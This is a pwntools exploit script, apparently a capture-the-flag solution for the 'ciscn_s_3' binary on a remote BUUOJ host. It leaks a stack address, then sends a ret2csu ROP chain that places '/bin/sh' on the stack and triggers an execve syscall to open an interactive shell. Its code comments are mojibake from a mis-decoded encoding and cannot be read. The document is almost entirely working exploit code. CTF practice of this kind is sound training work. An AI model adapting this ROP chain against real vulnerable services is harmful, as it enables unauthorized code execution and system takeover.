
from pwn import*
elf=ELF('./ciscn_s_3')
p=remote('node4.buuoj.cn',25849)
#p=process('./ciscn_s_3')
context.log_level='debug'

vuln=elf.sym['vuln']
mov_rax_0x3b=0x4004e2
pop_rdi=0x4005a3
syscall=0x400501
rop1=0x40059a#libc_csu_fini��ַ
rop2=0x400580#libc_csu_init��ַ

payload=b'a'*0x10+p64(vuln)#vuln��������pop rbp�Ĳ�����ֱ��ret
p.sendline(payload)
p.recv(0x20)
#gdb.attach(p)
stack=u64(p.recv(8))-0x118#ͨ��writeй©�ĵ�ַ��rsp����һ���ľ���
print(hex(stack))
payload=b'/bin/sh\x00'+b'a'*8+p64(rop1)
payload+=p64(0)
payload+=p64(0)
#��libc_csu_init��call [r12+rbp*8]����ת����Ӧ�ĵ�ַ����ת��ջ�Ͼ��ܼ���ִ��rop����
payload+=p64(stack+0x50)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(rop2)
payload+=p64(pop_rdi)
payload+=p64(stack)
payload+=p64(mov_rax_0x3b)
payload+=p64(syscall)
p.sendline(payload)
p.interactive()